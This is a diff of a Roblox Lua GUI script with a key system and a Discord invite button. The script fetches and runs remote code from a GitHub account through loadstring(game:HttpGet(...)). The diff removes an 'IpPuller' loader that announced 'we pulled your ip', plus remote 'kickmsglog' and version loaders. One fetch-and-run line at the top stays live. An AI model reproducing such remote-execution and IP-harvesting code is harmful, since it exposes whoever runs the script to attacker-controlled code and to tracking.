@@ -1,8 +1,6 @@
 -- Gui to Lua
 -- Version: 3.2
-
 -- Instances:
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/e",true))();
     wait(0.2)
 if table.find(G_sussytable, game.Players.LocalPlayer.UserId) then
@@ -159,15 +157,12 @@ else
     		key.Text = ""
     	end
     end)    
-
-
 	Disocrd.MouseButton1Click:Connect(function()
 		setclipboard("https://discord.gg/ja5g4ym7WB")
 		toclipboard("https://discord.gg/ja5g4ym7WB")
 		print"Copied"
 	end)
 	
-
     local function EZDNAOF_fake_script() -- keyfindsystems.Dragify 
     	local script = Instance.new('LocalScript', keyfindsystems)
     
@@ -219,17 +214,9 @@ else
     	print"loaded text"
     
 
-    
+
     local function OHWDD_fake_script()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
-    print" we pulled your ip loaded ip puller"
+    wait(0)
+    print"Okay can we Stop"
     end
     coroutine.wrap(OHWDD_fake_script)()
-    
-    local SuperWheat = Instance.new("BoolValue")
-    SuperWheat.Name = "ncca"
-    SuperWheat.Parent = game.Players.LocalPlayer
-end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/Version"))()
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/kickmsglog"))()
